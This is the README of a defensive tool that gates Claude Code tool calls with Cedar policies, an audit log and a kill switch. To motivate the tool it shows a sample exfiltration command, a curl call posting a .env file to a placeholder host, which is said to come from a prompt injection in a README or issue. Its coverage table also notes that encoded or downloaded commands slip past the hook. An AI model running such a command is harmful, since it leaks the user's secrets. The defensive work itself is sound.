<a id="readme-top"></a>

<h1 align="center">🛡️ AI Security Command Center</h1>

<p align="center">
  <em>Decide what every AI agent may do, prove what it did,<br>and stop it when it shouldn't.</em>
</p>

<p align="center">
  <a href="docs/README.md"><strong>Explore the docs »</strong></a>
</p>

<p align="center">
  <a href="#-quick-start">Quick start</a>
  ·
  <a href="#-coverage-what-the-hook-sees-and-what-it-doesnt">Coverage</a>
  ·
  <a href="docs/ROADMAP.md">Roadmap</a>
  ·
  <a href="https://github.com/ai-automation-tools/ai-security-command-center/issues">Report Bug</a>
  ·
  <a href="https://github.com/ai-automation-tools/ai-security-command-center/issues">Request Feature</a>
</p>

<p align="center">
  <a href="https://ai-security-command-center-demo.ai-automation-tools.dev/"><img src="https://img.shields.io/badge/Live_Demo-open-c084fc?style=for-the-badge" alt="Live demo"></a>
  <img src="https://img.shields.io/badge/status-incubating-F59E0B?style=for-the-badge" alt="Status: incubating">
  <a href="docs/ROADMAP.md"><img src="https://img.shields.io/badge/plan-ROADMAP-8B5CF6?style=for-the-badge" alt="Roadmap"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-2ea44f?style=for-the-badge" alt="License: MIT"></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.26-00ADD8?style=flat-square&logo=go&logoColor=white" alt="Go 1.26">
  <img src="https://img.shields.io/badge/Cedar-policies-FF9900?style=flat-square" alt="Cedar policies">
  <img src="https://img.shields.io/badge/Claude_Code-hook-D97757?style=flat-square" alt="Claude Code hook">
  <img src="https://img.shields.io/badge/network_calls-zero-6B7280?style=flat-square" alt="Network calls: zero">
</p>

---

> [!WARNING]
> **Incubating.** The policy decision point, the Claude Code hook, the audit log, the kill switch and the posture
> check, `discover` and the inventory of agents and the non-human identities they use work and are tested.
> So does the [browser demo](https://ai-security-command-center-demo.ai-automation-tools.dev/). Nothing here has had an outside review. The [roadmap](docs/ROADMAP.md) says what's next.

## 🎯 What it's for

Your coding agent can run any command your shell can. One injected line in a README or an issue, and it runs
`curl -d @.env https://paste.example` for you. Allow-lists inside each tool don't add up to a policy, and
afterwards nobody can say what the agent was allowed to do.

ASCC (`ascc`) puts one policy decision point in front of the agent:

| Command | Status | What it does |
|:---|:---|:---|
| **`decide`** | works | Evaluates a request (agent, action, resource, context) against Cedar policies and an agent registry. Default deny, with the policy ids and a plain-English reason for every answer. |
| **`hook claude-code`** | works | Runs as a Claude Code PreToolUse hook: asks the policies before every tool call, blocks the denied ones and records every decision. Any error blocks the call. [Setup guide](docs/guides/claude-code-setup.md). |
| **`audit verify`** | works | Checks the hash-chained log every decision lands in and names the first line that was edited, removed or reordered. `--expect-head <hash>` catches lines cut off the end. |
| **`kill` / `revive`** | works | Suspends an agent so everything it asks for is denied, and brings it back. Both are audited. `kill` lists the identities the agent uses, which still work until you rotate or revoke them. |
| **`posture claude-code`** | works | Reads the Claude Code settings files, never writes them, and says for each agent whether its hook is registered so that it enforces: in managed settings, matcher `*`, `"onFailure": "block"`, nothing switching it off. Each failure names its reason. [What it checks](docs/guides/claude-code-setup.md#posture). |
| **`discover`** | works | Searches a folder for the agent config files it knows (Claude Code settings, `.mcp.json`, `.claude.json` and the managed files) and reports what the registry doesn't list: a Claude Code setup with no ascc hook, a hook for an unregistered agent, an MCP server none of whose tools is listed. Variable names that look like credentials become candidate identities. It reads names only, never a value. [What it finds](docs/guides/claude-code-setup.md#discover). |
| **`inventory`** | works | Writes the registry as an Agent Security Suite inventory document: the agents, and the service accounts, bots, CI jobs, OAuth apps and MCP servers they use. Findings name an agent with no owner or no policy, and an identity with no owner, an overdue credential, no agent using it, or a stopped agent still holding it. `--import <file>` merges identities from another suite tool's document. Each agent's label is computed from evidence, never declared: `unmonitored` when the hook has recorded nothing for it, `observed` when it has but the posture check doesn't pass, `enforced` only with both. [The identity list](docs/guides/claude-code-setup.md#identities). |

The browser demo runs the same Go core as WebAssembly on a planted setup: the injected `curl` call shows as
denied on first load, and you can edit the policy, replay the calls, edit the audit log and flip the kill switch.
It is live at [ai-security-command-center-demo.ai-automation-tools.dev](https://ai-security-command-center-demo.ai-automation-tools.dev/), published from `main` by the
Pages workflow. To build it yourself, run `go run ./src/cmd/buildsite` and serve `_site/` with any static file
server. The page makes no network call.

That's the public MVP. The full design, a gateway for MCP and LLM traffic, a credential broker, default-deny
egress, a plugin platform and NHI connectors, is in the [planning package](docs/product/plan/README.md) and gets
built in public after release.

### What it won't do

This version, by design. The first is the next thing to be built; the rest are not on the way.

- **Sit in the network path.** No gateway, proxy or credential broker. The Claude Code hook is the only
  enforcement point.
- **Make a network call.** The CLI and the demo read and write local files only. A test fails if the binary
  ever links a package that can open a socket.
- **Hold or print a secret.** The audit log keeps a hash of each tool input, never the input. An identity's
  credential is a fingerprint and dates.
- **Let a model decide.** Decisions come from Cedar policy alone: no score, no model reviewer.
- **Claim coverage it doesn't have.** An agent it can't see is `unmonitored`, never left off the report.
- **Change a non-human identity.** No disable, rotate or revoke. It lists what to do and a person does it on
  the platform that holds the account.
- **Push settings to machines.** `posture` reads Claude Code's settings and never writes them.
- **Run on anything but Claude Code,** or come with accounts, telemetry, a hosted service or a paid tier.

## 🚀 Quick start

With Go 1.26 or newer:

```bash
go install github.com/ai-automation-tools/ai-security-command-center/src/cmd/ascc@latest
```

Or build it from a clone, which also gives you the sample files to try it on:

```bash
go build -o bin/ ./src/cmd/ascc   # builds bin/ascc (bin/ascc.exe on Windows)
cd examples                       # a sample registry, policies, requests and hook payloads, all fictional
../bin/ascc decide --request requests/exfil-curl.json
```

That request is `dev-agent` asking to run a shell command that touches a secret file and the network:

```json
{
  "decision": "deny",
  "policy_ids": [
    "deny-network-with-secret-path"
  ],
  "reason": "forbidden by deny-network-with-secret-path: a shell command may not send a secret file over the network"
}
```

Now the same call as Claude Code would send it, through the hook, then the log it was written to and the
kill switch:

```bash
../bin/ascc hook claude-code --agent dev-agent < hook-payloads/exfil-curl.json
../bin/ascc audit verify
../bin/ascc kill dev-agent
```

```text
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"ascc: forbidden by deny-network-with-secret-path: a shell command may not send a secret file over the network"}}

audit: ok, 1 entries, head <a 64-character hash>
audit: the head wasn't checked. Lines cut off the end still verify; record the head somewhere else and pass it back with --expect-head.

dev-agent is suspended
dev-agent uses the identities below, and stopping it here doesn't stop them. ascc holds no credential: rotate or revoke these yourself.
  github:app/release-bot (bot on github, active)
```

The first line is the answer Claude Code blocks the call on. An allowed call prints nothing, so Claude Code's own
permission rules still apply. After the kill, everything `dev-agent` asks for is denied until
`../bin/ascc revive dev-agent`.

To put it in front of a real agent, follow the [Claude Code setup guide](docs/guides/claude-code-setup.md).

### Commands and flags

| Command | Flags | Exit codes |
|:---|:---|:---|
| **`ascc decide`** | `--request <file>`, or `--request -` for stdin | 0 a decision was made, allow or deny; 2 ascc couldn't run, and it still prints a deny |
| **`ascc hook claude-code`** | `--agent <id>` (required), `--repo <dir>` (default: the payload's working directory). The payload comes on stdin. | 0 a decision was made: a deny prints the blocking JSON, an allow prints nothing; 2 ascc couldn't run, which also blocks the call |
| **`ascc audit verify`** | `--expect-head <hash>` fails unless the log ends at that hash | 0 the log verifies; 1 it doesn't; 2 ascc couldn't read it |
| **`ascc kill <agent>`**, **`ascc revive <agent>`** | none | 0 done; 2 the agent is unknown or retired |
| **`ascc posture claude-code`** | `--agent <id>` checks one agent; `--managed <file>`, `--user <file>`, `--project <dir>` point at other settings | 0 every agent passes; 1 one fails; 2 ascc couldn't run |
| **`ascc discover`** | `--root <dir>` (default: the current folder), `--out <file>` | 0 everything under the root was read; 1 something couldn't be, and is named on stderr; 2 ascc couldn't run |
| **`ascc inventory`** | `--import <file>` (repeatable), `--out <file>`, and the three settings flags `posture` takes | 0 done, with a warning on stderr if two imports describe one id differently; 2 ascc couldn't run or an import isn't a valid suite document |
| **`ascc version`**, **`ascc help`** | none | 0 |

Every command also takes `--registry <file>` (default `ascc.registry.json`), `--policies <dir>` (default
`policies`, every `*.cedar` file in it) and `--audit <file>` (default `.ascc/audit.jsonl`), all relative to the
current folder.

In `examples/`, `ascc inventory` prints six findings: the sample registry plants a suspended agent, an agent
with no owner, an ownerless service account, an overdue credential, an OAuth app nothing uses and an identity
a suspended agent still holds. `ascc posture claude-code` exits 1 there and says why: the sample agents have no
hook in managed settings.

What's denied without any policy saying so: an agent or a tool that isn't in the registry, a suspended or retired
agent, a request whose context doesn't fit the built-in schema, a policy that errors while evaluating, and
anything no policy permits. A registry with a typo, or a policy with no `@id` or one that reads an attribute
the schema doesn't have, stops ascc loading at all, and the hook blocks every call until it is fixed.

## 🔭 Coverage: what the hook sees and what it doesn't

ascc sees a tool call only when Claude Code runs its hook, and judges a shell command by its text.

| The hook sees | The hook doesn't see |
|:---|:---|
| Every tool call Claude Code makes while the hook is registered with matcher `*`: built-in tools and MCP tools alike. A tool that isn't in the registry is denied. | Anything, once the hook is removed or switched off. A hook in project or user settings can be edited by the agent's user; only managed settings hold it in place, and `ascc posture claude-code` checks that. |
| The command text of `Bash` and `PowerShell` calls, parsed into facts: does it reach the network, touch a secret file, push to a branch, change ascc's own files. | What a command does beyond its text. An encoded, aliased or downloaded command gets past the parser. Treat the policies as a guard against accidents and plain injected lines, not a sandbox. |
| The file path of `Read`, `Write` and `Edit` calls, and whether it is inside the repo. | Files pulled in with `@` mentions, and where a symlink inside the repo really points. |
| Which agent the hook registration says is asking. | Who is really asking: the id is asserted by `--agent`, not proven. |
| Nothing on the network. | Traffic an allowed tool sends. There is no proxy in this version. |

The inventory says how far each agent is covered, from evidence and never from a declaration: `unmonitored`
when the hook has recorded nothing for it, `observed` when it has but the posture check doesn't pass, `enforced`
only with both. The [setup guide's limits table](docs/guides/claude-code-setup.md#limits) has the full list and
what to do about each.

## ⚖️ Responsible use

ascc is a defensive tool.

- **Run it on agents and machines you own or are authorized to control.**
- **It attacks nothing and contacts nothing.** It never exploits anything and never sends a request anywhere.
- **It writes only its own files:** the registry (on `kill` and `revive`), the audit log, and the document you
  ask for with `--out`. It reads Claude Code's settings and never changes them.
- **A deny is only as good as the policy and the hook's coverage.** Read the coverage section above before
  relying on one, and keep ascc's files where the agent's user can't write them.
- **The demo and the samples are planted.** Every agent, host and account in `examples/` and on the demo page is
  fictional.

## 🧰 The rest of the suite

ASCC is the enforcing part of the Agent Security Suite. Its sibling tools inspect and inventory; none of them
blocks a tool call, and ASCC doesn't do their job. All three are early: each one's own README says what works
today, and the table says what it is for.

| Tool | What it does | Where ASCC picks up |
|:---|:---|:---|
| [**mcp-frisk**](https://github.com/ai-automation-tools/mcp-frisk) | Lints MCP configs offline for shell-injection shapes and plaintext secrets, without starting a server. | `discover` reports the MCP servers the registry doesn't list; the hook denies a call to a tool that isn't registered. |
| [**mcp-tool-rugpull-gate**](https://github.com/ai-automation-tools/mcp-tool-rugpull-gate) | Locks the MCP tool definitions you approved and shows what changed since. | ASCC decides on the tool's id, not its definition: a tool that changed under the same name is still allowed. ASCC doesn't close that gap; the gate is the tool meant to. |
| [**scope-drift-trimmer**](https://github.com/ai-automation-tools/scope-drift-trimmer) | Lists what each non-human identity was granted next to what it used, and drafts the trim for a person to run. | `inventory` lists the identities each agent uses and flags the ownerless, overdue and unlinked ones. It doesn't know what an identity was granted. |

Where one of them writes the suite's
[agent inventory document](schemas/agent-inventory.schema.json), `ascc inventory --import <file>` merges it. An
imported file adds identities. It can mark its own entries `unmonitored`, never `observed` or `enforced`, and it
never replaces what the registry declares.

## 🗂️ What's in here

| Folder | What's inside |
|:---|:---|
| [**📚 docs/**](docs/README.md) | The roadmap, the changelog, the public-MVP spec and build plan, the full planning package and the resource library. |
| [**🧩 src/**](src/) | The Go code: `cmd/ascc` is the CLI, `cmd/ascc-wasm` the browser build, `cmd/buildsite` the demo's build tool, and `internal/` holds the packages. Tests sit next to the code. `cmd/ascc-pdp` is the decision point as a service and `cmd/ascc-schema` the schema validator, both binaries of their own for the platform still being built. `spikes/pluginhost` is a prototype and `spikes/gatewayrun` the harness that ran agentgateway against a stub policy service, each in a Go module of its own. None of the four is part of `ascc`. |
| [**🧪 examples/**](examples/) | A sample registry, Cedar policies, requests and hook payloads with fictional agents. The tests run these same files. |
| [**🧱 deploy/**](deploy/compose/README.md) | The development stack for the platform still being built: a Compose file that starts Postgres, Keycloak, OpenBao, Jaeger, `ascc-pdp` and an egress placeholder on loopback. `ascc` needs none of it. |
| [**📐 schemas/**](schemas/) | The Agent Security Suite inventory schema, v0.1, vendored from `ai-automation-tools.dev`, and under [`platform/`](schemas/platform/README.md) the schemas for the platform still being built, with the `ascc-schema` validator. |
| [**🖥️ site/**](site/) | The browser demo: the page, its two scripts and the favicon. `go run ./src/cmd/buildsite` adds the WebAssembly and the fixtures and writes `_site/`. |

## 🛠️ Development

```bash
gofmt -l .        # must print nothing
go vet ./...
go test ./...
go build ./...
```

[CONTRIBUTING.md](CONTRIBUTING.md) says how to add a policy with its allow and deny fixtures.
Agents working this repo read [AGENTS.md](AGENTS.md) first. Security reports go through
[SECURITY.md](SECURITY.md), not public issues.

---

<p align="center">
  Built with <a href="https://go.dev/">Go</a> · <a href="docs/README.md">Docs</a> · <a href="LICENSE">MIT License</a> · part of <a href="https://github.com/ai-automation-tools">ai-automation-tools</a>
</p>
